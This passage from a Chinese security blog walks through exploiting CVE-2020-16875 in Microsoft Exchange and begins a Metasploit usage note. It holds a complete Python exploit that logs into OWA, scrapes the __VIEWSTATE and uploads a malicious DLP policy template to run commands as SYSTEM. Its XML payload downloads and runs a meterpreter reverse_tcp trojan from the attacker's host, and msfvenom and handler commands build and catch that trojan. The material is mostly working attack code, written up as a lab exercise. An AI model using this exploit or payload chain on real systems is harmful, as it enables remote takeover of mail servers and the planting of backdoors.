class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">keywords</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>&gt;</span><span class="tag">&lt;/<span class="name">ruleParameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- The contents below are applied/executed as rules directly in PS - --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ new-transportRule &quot;PCI-DSS: Monitor Payment Card Information Sent To Outside&quot; -DlpPolicy &quot;%%DlpPolicyName%%&quot; -SentToScope NotInOrganization -SetAuditSeverity High -MessageContainsDataClassifications @&#123;Name=&quot;Credit Card Number&quot;; MinCount=&quot;1&quot; &#125; -Comments &quot;Monitors payment card information sent to outside the organization as part of the PCI-DSS DLP Policy.&quot;]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ new-transportRule &quot;PCI-DSS: Monitor Payment Card Information Sent To Within&quot; -DlpPolicy &quot;%%DlpPolicyName%%&quot; -Comments &quot;Monitors payment card information sent inside the organization as part of the PCI-DSS DLP Policy.&quot; -SentToScope InOrganization -SetAuditSeverity Low -MessageContainsDataClassifications @&#123;Name=&quot;Credit Card Number&quot;; MinCount=&quot;1&quot; &#125; ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommandsResources</span>&gt;</span><span class="tag">&lt;/<span class="name">policyCommandsResources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dlpPolicyTemplate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    可以看到，在<strong>&lt;commandBlock&gt;<strong>标签中，我们可以使用MSExchange提供的一条cmdlet：</strong>new-transportRule</strong>，这条cmdlet最终会被送入刚刚提到的<strong>PSCommand</strong>函数调用的<strong>New-DLPPolicy cmdlet</strong>的-<strong>TemplateData</strong>中得到执行，但是此过程中没有进行任何的校验！</p><p>​    因此，我们猜测，也可以直接提供一条powershell的cmdlet，该cmdlet最终也会被执行。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="一、手动利用poc流程"><a href="#一、手动利用poc流程" class="headerlink" title="一、手动利用poc流程"></a>一、手动利用poc流程</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322104712473.png" alt="image-20220322104712473"></p><p>新建用户：密码为Cve16875</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322104428000.png" alt="image-20220322104428000"></p><p>在靶机服务器打开<code>Exchange Management Shell</code>，执行代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-RoleGroup</span> <span class="literal">-Name</span> <span class="string">&quot;dlp users&quot;</span> <span class="literal">-Roles</span> <span class="string">&quot;Data Loss Prevention&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="built_in">Get-RoleGroup</span> <span class="string">&quot;dlp users&quot;</span> | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322110527767.png" alt="image-20220322110527767"></p><p>手动执行：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322134903135.png" alt="image-20220322134903135"></p><p>上传poc.xml文件。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322135008945.png" alt="image-20220322135008945"></p><p>可以看到我们执行了cmd.exe，证明poc是可行的。</p><h3 id="二、脚本进行poc"><a href="#二、脚本进行poc" class="headerlink" title="二、脚本进行poc"></a>二、脚本进行poc</h3><p>上述过程总体还是比较繁琐，我们可以将其转化为脚本一键执行</p><p>执行脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./poc.py <span class="number">192.168</span>.<span class="number">6.143</span> hello@cve16875.com:Cve16875 cmd.exe</span><br></pre></td></tr></table></figure><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span>(<span class="params">str_len=<span class="number">8</span></span>):</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(str_len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id=&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot; mode=&quot;Audit&quot; state=&quot;Enabled&quot; version=&quot;15.0.2.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang=&quot;en&quot;&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=&quot;cmd&quot;;$i.Arguments=&quot;/c %s&quot;;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;&quot;&quot;&quot;</span> % c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span>(<span class="params">t, s, vs, cmd</span>):</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">&#x27;__VIEWSTATE&#x27;</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$senderBtn&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;ResultPanePlaceHolder_ButtonsPanel_btnNext&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$contentContainer$name&#x27;</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">&#x27;ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl&#x27;</span>: (<span class="string">&quot;dlprce.xml&quot;</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">&quot;https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger rce!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span>(<span class="params">t, s</span>):</span><span class="comment">#类似是做了一个爬虫，爬取网站的内容</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    r = s.get(<span class="string">&quot;https://192.168.6.143/ecp/DLPPolicy/ManagePolicyFromISV.aspx&quot;</span>, verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    match = re.search(<span class="string">&quot;&lt;input type=\&quot;hidden\&quot; name=\&quot;__VIEWSTATE\&quot; id=\&quot;__VIEWSTATE\&quot; value=\&quot;(.*)\&quot; /&gt;&quot;</span>, r.text)<span class="comment">#做了一个正则匹配</span></span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">&quot;(-) couldn&#x27;t leak the __viewstate!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span>(<span class="params">t, usr, pwd</span>):</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">&quot;destination&quot;</span> : <span class="string">&quot;https://%s/owa&quot;</span> % t,</span><br><span class="line">        <span class="string">&quot;flags&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;password&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">&quot;https://%s/owa/auth.owa&quot;</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">&#x27;X-OWA-CANARY&#x27;</span>) != <span class="literal">None</span>, <span class="string">&quot;(-) couldn&#x27;t leak the csrf canary!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">t, usr, pwd, cmd</span>):</span></span><br><span class="line">    s = log_in(t, usr, pwd)<span class="comment">#先用已有账号登录，用一个session对象存起来</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) logged in as %s&quot;</span> % usr)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    vs = leak_viewstate(t, s)<span class="comment">#传入地址和session</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) found the __viewstate: %s&quot;</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(+) executed %s as SYSTEM!&quot;</span> % cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(+) eg: %s 192.168.75.142 harrym@exchangedemo.com:user123### mspaint&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">&quot;(-) you need a user and password!&quot;</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure><p>通过一个脚本，我们全自动的实现了命令执行这一流程，不再需要自行进行请求，更加方便了。</p><h3 id="三、exp的生成"><a href="#三、exp的生成" class="headerlink" title="三、exp的生成"></a>三、exp的生成</h3><p>​    上面我们已经达到了命令执行的效果，但是我们不能每次都通过命令执行的漏洞进行命令执行操作，这样不够方便，也不够稳定，因此我们选用<strong>metasploit</strong>。</p><p>​    在这里不对metasploit的使用进行赘述，可以参考<a href="https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">我的另一篇博客</a>。</p><p>​    在生成了木马文件后，在kali上部署服务，将木马文件放置在var/www/html目录下，然后运行apache2服务。</p><p>这样一来，我们可以通过访问uri的方式下载木马文件，通过如下语句，即可下载并执行木马文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">192.168</span>.<span class="number">6.130</span>/meter_re_tcp_x86.exe <span class="literal">-OutFile</span> C:\Users\<span class="number">86183</span>\Desktop\bkdoor.exe) ; (C:\Users\<span class="number">86183</span>\Desktop\bkdoor.exe)</span><br></pre></td></tr></table></figure><p>注：此处连接符不能用 <code>-and</code>，因为<code>-and</code>连接符会导致第一句中文件还没下载结束前，第二句就已经开始执行，导致返回false。</p><p>我们将上述内容粘贴进xml文件的相应位置（如自动化执行，只需要更改输入的参数）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dlpPolicyTemplate</span> <span class="attr">id</span>=<span class="string">&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;Audit&quot;</span> <span class="attr">state</span>=<span class="string">&quot;Enabled&quot;</span> <span class="attr">version</span>=<span class="string">&quot;15.0.2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contentVersion</span>&gt;</span>4<span class="tag">&lt;/<span class="name">contentVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publisherName</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">publisherName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>PCI-DSS-12345<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">keywords</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>&gt;</span><span class="tag">&lt;/<span class="name">ruleParameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- The contents below are applied/executed as rules directly in PS - --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=&quot;cmd&quot;;$i.Arguments=&quot;/c (Invoke-WebRequest -Uri http://192.168.6.130/meter_re_tcp_x86.exe -OutFile C:\Users\86183\Desktop\bkdoor.exe) ; (C:\Users\86183\Desktop\bkdoor.exe)&quot;;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start(); ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommandsResources</span>&gt;</span><span class="tag">&lt;/<span class="name">policyCommandsResources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dlpPolicyTemplate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照上文中的方法上传：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326202822403.png" alt="image-20220326202822403"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326203246567.png" alt="image-20220326203246567"></p><p>可以看到服务器自动下载并运行了该木马程序，我们可以后续进行持久化、进程迁移等等后续工作。</p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p>漏洞基本信息：</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16875">https://nvd.nist.gov/vuln/detail/CVE-2020-16875</a></p><p>环境搭建部分：</p><p><a href="https://saucer-man.com/information_security/748.html#cl-6">https://saucer-man.com/information_security/748.html#cl-6</a></p><p>逆向思路参考：</p><p><a href="https://www.anquanke.com/post/id/219091?from=timeline#h2-1">https://www.anquanke.com/post/id/219091?from=timeline#h2-1</a></p><p>实验过程参考：</p><p><a href="https://blog.csdn.net/z136370204/article/details/109818580">https://blog.csdn.net/z136370204/article/details/109818580</a></p><p>MS官网：</p><p><a href="https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help">https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help</a></p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p><p><a href="https://docs.microsoft.com/zh-cn/powershell/exchange/exchange-cmdlet-syntax?view=exchange-ps">https://docs.microsoft.com/zh-cn/powershell/exchange/exchange-cmdlet-syntax?view=exchange-ps</a></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit的使用笔记</title>
      <link href="/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit的使用笔记"><a href="#Metasploit的使用笔记" class="headerlink" title="Metasploit的使用笔记"></a>Metasploit的使用笔记</h1><blockquote><p><strong>Metasploit项目</strong>是一个旨在提供<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p><p>Metasploit项目最为知名的子项目是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具。其他重要的子项目包括Opcode数据库、shellcode文件、安全研究等内容。</p><p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p></blockquote><p>摘自：维基百科<a href="https://zh.wikipedia.org/wiki/Metasploit">https://zh.wikipedia.org/wiki/Metasploit</a></p><p>msf很像是python，它是有自己的命令执行窗口的，快速打开执行窗口（-q表示快速quick）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure><h2 id="0x01-木马文件的配置与生成"><a href="#0x01-木马文件的配置与生成" class="headerlink" title="0x01 木马文件的配置与生成"></a>0x01 木马文件的配置与生成</h2><p>此后的命令都是在<strong>msfconsole</strong>中输入的：</p><h3 id="一、配置木马："><a href="#一、配置木马：" class="headerlink" title="一、配置木马："></a>一、配置木马：</h3><p>选择模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>输出当前选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321102830032.png" alt="image-20220321102830032"></p><p>可以看到输出了我们使用的<strong>Module</strong>（现在还没选），同时还有<strong>payload options</strong>，其中显示的是监听主机的<strong>localhost</strong>和<strong>localport</strong>，此时，我们需要对其中的各个选项进行设置。</p><p>设置主机<strong>LHOST</strong>（攻击者ip）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.119.133</span><br></pre></td></tr></table></figure><p>然后我们需要设置<strong>payload</strong>：</p><p>我们可以先通过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure><p>来展示所有payload，同时也可以随时使用tab键打印提示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321104545327.png" alt="image-20220321104545327"></p><p>设置<strong>payload</strong>使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>至此，已经全部配置完毕。</p><h3 id="二、生成木马："><a href="#二、生成木马：" class="headerlink" title="二、生成木马："></a>二、生成木马：</h3><p>打开新的命令窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o ./meter_re_tcp_x86.exe LOHOST=192.168.6.130 LPORT=4444</span><br></pre></td></tr></table></figure><p>指定木马的内容，对应的文件格式，靶机的系统架构，还有我们监听者的IP和端口。</p><h3 id="三、开启监听："><a href="#三、开启监听：" class="headerlink" title="三、开启监听："></a>三、开启监听：</h3><p>在刚刚配置木马的<strong>msfconsole</strong>中，输入<code>run</code>或者<code>exploit</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321110128592.png" alt="image-20220321110128592"></p><p>第一次失败了，我们可以尝试换端口，然后就成功开启监听了。</p><p>连接之后，可以通过**meterpreter&gt;**命令行控制。</p><h3 id="四、通过文件快速启动："><a href="#四、通过文件快速启动：" class="headerlink" title="四、通过文件快速启动："></a>四、通过文件快速启动：</h3><p>由于每次过程比较复杂，所以我们可以使用shell脚本和文件msf自带的读取文件执行命令的方式，更快速的完成上面的步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">x86_win.sh</span></span><br><span class="line">ip=192.168.6.130</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line">out=../Backs/meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p $payload -f $format -a $arch --platform $platform -o $out LHOST=$ip LPORT=$port</span><br></pre></td></tr></table></figure><p>此文件用于生成木马文件，执行shell文件即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.6.130</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>此文件用于快速开启监听，使用命令如下开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r ./run_x86_mete_re</span><br></pre></td></tr></table></figure><h2 id="0x02-捆绑、混淆"><a 